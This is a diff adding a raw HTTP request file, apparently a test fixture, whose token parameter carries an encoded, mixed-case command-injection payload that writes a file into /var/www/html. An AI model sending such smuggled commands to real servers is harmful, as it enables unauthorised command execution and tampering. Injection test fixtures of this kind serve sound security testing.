@@ -1,0 +1,4 @@
+GET /a?token=;%20eChO%20eViL%20>%20/vAr/WwW/hTmL/c.TxT HTTP/1.1
+Host: demo.example.com
+Connection: close
+
